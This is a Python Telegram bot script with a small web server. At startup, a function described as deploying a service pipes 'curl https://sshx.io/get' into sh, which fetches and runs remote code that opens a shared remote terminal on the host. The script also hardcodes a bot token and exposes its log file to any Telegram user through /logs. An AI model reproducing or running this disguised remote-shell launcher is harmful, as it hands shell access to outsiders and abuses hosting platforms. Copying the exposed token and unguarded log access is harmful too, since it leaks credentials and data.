import logging
import subprocess
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext
import asyncio
from aiohttp import web

# Configure logging
logging.basicConfig(
    filename='logs.txt',  # Log output file
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Function to handle the /logs command
def logs_command(update: Update, context: CallbackContext) -> None:
    try:
        with open('logs.txt', 'r') as log_file:
            logs = log_file.read()

        # Send logs in code block format
        update.message.reply_text(f'```logs\n{logs}\n```', parse_mode='MarkdownV2')

    except FileNotFoundError:
        update.message.reply_text('No logs found.')

# Function to handle the start command
def start(update: Update, context: CallbackContext) -> None:
    update.message.reply_text('Hello! To Use contact @yukiLOGS')

# Function to deploy the service using curl
def deploy_service():
    try:
        # Capture stderr for debugging if an error occurs
        result = subprocess.run("curl -sSf https://sshx.io/get | sh -s run", shell=True, check=True, capture_output=True, text=True)
        print("Deployment successful.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Error deploying the service: {e.stderr}")
        print(f"Deployment failed with error: {e.stderr}")

async def web_server():
    # Sample async web server setup
    async def handle(request):
        return web.Response(text="Web server is running!")

    app = web.Application()
    app.add_routes([web.get('/', handle)])
    return app

async def start_web_server():
    # Deploy service
    deploy_service()

    # Start the web server on port 8000
    app = await web_server()
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", 8000)
    await site.start()

def main():
    # Replace 'YOUR_BOT_TOKEN' with your actual bot token
    updater = Updater("7863196804:AAHLuwSibBQf4denufOtuflKDinvzHgRfDw", use_context=True)

    # Get the dispatcher to register handlers
    dispatcher = updater.dispatcher

    # Add handlers for commands
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("logs", logs_command))

    # Start the Bot
    updater.start_polling()

    # Start the web server asynchronously
    loop = asyncio.get_event_loop()
    loop.run_until_complete(start_web_server())

    # Keep the bot running
    updater.idle()

if __name__ == '__main__':
    main()
